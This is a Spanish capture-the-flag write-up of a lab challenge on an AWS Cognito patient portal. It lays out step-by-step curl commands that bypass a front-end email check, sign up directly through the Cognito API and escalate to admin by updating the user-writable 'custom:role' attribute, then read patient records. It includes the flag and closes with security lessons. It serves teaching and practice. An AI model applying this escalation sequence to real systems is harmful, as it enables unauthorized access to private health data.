# MediCloudX Patient Portal - Parte 1 - Writeup

## Información del Reto
- **Nombre**: MediCloudX Patient Portal - Parte 1
- **Puntos**: 20
- **Objetivo**: Obtener el contenido de `/patients`
- **URL**: http://ctf-25-cognito-web-ts0mp822.s3-website-us-east-1.amazonaws.com/

## Flag
```
CTF{m3d1cl0udx_d4t4b4s3_4cc3ss_pr1v1l3g3_3sc4l4t10n}
```

## Vulnerabilidad
**Privilege Escalation via AWS Cognito Custom Attributes**

El User Pool de Cognito permitía a los usuarios modificar sus propios atributos personalizados (`custom:role`), lo que permitía escalar de `reader` a `admin`.

---

## Paso 1: Análisis del Código Fuente

Al inspeccionar el HTML/JavaScript de la página, encontré la configuración de Cognito expuesta:

```javascript
const COGNITO_CONFIG = {
    region: 'us-east-1',
    userPoolId: 'us-east-1_frZ3u7zmn',
    clientId: 'clt9hlac04nl1nqh3godubqg',
    identityPoolId: 'us-east-1:4343baa8-ec9b-4f5c-a56c-7003fdc6baca',
    apiEndpoint: 'https://sd94qvbn6g.execute-api.us-east-1.amazonaws.com/prod/patients'
};
```

También identifiqué:
- Validación de email solo en el frontend (dominios `medicloudx.com`, `healthcorp.org`)
- El rol del usuario se almacena en `custom:role`
- Se requiere rol `admin` para acceder a `/patients`

---

## Paso 2: Obtener Email Temporal

Usé el servicio guerrillamail para obtener un email temporal real:

```bash
curl -s "https://api.guerrillamail.com/ajax.php?f=get_email_address"
```

Respuesta:
```json
{"email_addr":"bdekryuo@guerrillamailblock.com","sid_token":"5lm7fr4voeaknb5oesqu2h032q",...}
```

---

## Paso 3: Registrar Usuario (Bypass de Validación de Email)

Registré un usuario directamente via API de Cognito, saltando la validación del frontend:

```bash
curl -s -X POST \
  "https://cognito-idp.us-east-1.amazonaws.com/" \
  -H "Content-Type: application/x-amz-json-1.1" \
  -H "X-Amz-Target: AWSCognitoIdentityProviderService.SignUp" \
  -d '{
    "ClientId": "clt9hlac04nl1nqh3godubqg",
    "Username": "bdekryuo@guerrillamailblock.com",
    "Password": "HackPass123!",
    "UserAttributes": [
      {"Name": "email", "Value": "bdekryuo@guerrillamailblock.com"},
      {"Name": "given_name", "Value": "Hack"},
      {"Name": "family_name", "Value": "Admin"},
      {"Name": "custom:role", "Value": "admin"}
    ]
  }'
```

---

## Paso 4: Obtener Código de Verificación

Esperé unos segundos y consulté el email temporal:

```bash
curl -s "https://api.guerrillamail.com/ajax.php?f=check_email&seq=0&sid_token=5lm7fr4voeaknb5oesqu2h032q"
```

Encontré el código de verificación: `623989`

---

## Paso 5: Confirmar Usuario

```bash
curl -s -X POST \
  "https://cognito-idp.us-east-1.amazonaws.com/" \
  -H "Content-Type: application/x-amz-json-1.1" \
  -H "X-Amz-Target: AWSCognitoIdentityProviderService.ConfirmSignUp" \
  -d '{
    "ClientId": "clt9hlac04nl1nqh3godubqg",
    "Username": "bdekryuo@guerrillamailblock.com",
    "ConfirmationCode": "623989"
  }'
```

---

## Paso 6: Iniciar Sesión

```bash
curl -s -X POST \
  "https://cognito-idp.us-east-1.amazonaws.com/" \
  -H "Content-Type: application/x-amz-json-1.1" \
  -H "X-Amz-Target: AWSCognitoIdentityProviderService.InitiateAuth" \
  -d '{
    "AuthFlow": "USER_PASSWORD_AUTH",
    "ClientId": "clt9hlac04nl1nqh3godubqg",
    "AuthParameters": {
      "USERNAME": "bdekryuo@guerrillamailblock.com",
      "PASSWORD": "HackPass123!"
    }
  }'
```

**Problema**: El IdToken mostraba `"custom:role":"reader"` en lugar de `admin`. Un Lambda trigger sobrescribía el valor durante el registro.

---

## Paso 7: Escalación de Privilegios (Vulnerabilidad Principal)

Descubrí que el User Pool permitía a los usuarios actualizar sus propios atributos custom:

```bash
curl -s -X POST \
  "https://cognito-idp.us-east-1.amazonaws.com/" \
  -H "Content-Type: application/x-amz-json-1.1" \
  -H "X-Amz-Target: AWSCognitoIdentityProviderService.UpdateUserAttributes" \
  -d '{
    "AccessToken": "<ACCESS_TOKEN>",
    "UserAttributes": [
      {"Name": "custom:role", "Value": "admin"}
    ]
  }'
```

Respuesta: `{}` (éxito)

---

## Paso 8: Obtener Nuevo Token con Rol Admin

Volví a iniciar sesión para obtener un nuevo IdToken con el rol actualizado:

```bash
curl -s -X POST \
  "https://cognito-idp.us-east-1.amazonaws.com/" \
  -H "Content-Type: application/x-amz-json-1.1" \
  -H "X-Amz-Target: AWSCognitoIdentityProviderService.InitiateAuth" \
  -d '{
    "AuthFlow": "USER_PASSWORD_AUTH",
    "ClientId": "clt9hlac04nl1nqh3godubqg",
    "AuthParameters": {
      "USERNAME": "bdekryuo@guerrillamailblock.com",
      "PASSWORD": "HackPass123!"
    }
  }'
```

El nuevo IdToken ahora contenía `"custom:role":"admin"`.

---

## Paso 9: Acceder al Endpoint de Pacientes

```bash
curl -s "https://sd94qvbn6g.execute-api.us-east-1.amazonaws.com/prod/patients" \
  -H "Authorization: Bearer <ID_TOKEN>" \
  -H "Content-Type: application/json"
```

---

## Respuesta Final

```json
{
  "success": true,
  "data": [
    ...
    {
      "department": "administration",
      "diagnosis": "System Maintenance",
      "created_at": "2025-01-21T08:00:00Z",
      "access_level": "admin_only",
      "notes": "CTF{m3d1cl0udx_d4t4b4s3_4cc3ss_pr1v1l3g3_3sc4l4t10n}",
      "status": "active",
      "name": "System Administrator",
      "patient_id": "ADMIN_SYS_007"
    },
    ...
  ]
}
```

---

## Lecciones de Seguridad

1. **Nunca confiar en validaciones del lado del cliente** - La validación del dominio de email era fácilmente bypasseable.

2. **Restringir atributos custom modificables por el usuario** - En Cognito, se debe configurar qué atributos pueden ser modificados por los usuarios vs. solo por administradores.

3. **No exponer configuración sensible en el frontend** - Los IDs de User Pool, Client ID, etc., estaban expuestos en el JavaScript.

4. **Implementar autorización en el backend** - El API Gateway debería validar los roles usando grupos de Cognito en lugar de confiar en atributos que el usuario puede modificar.

---

## Herramientas Utilizadas
- curl
- guerrillamail API (email temporal)
- AWS Cognito Identity Provider API

## Autor
Writeup generado durante CTF
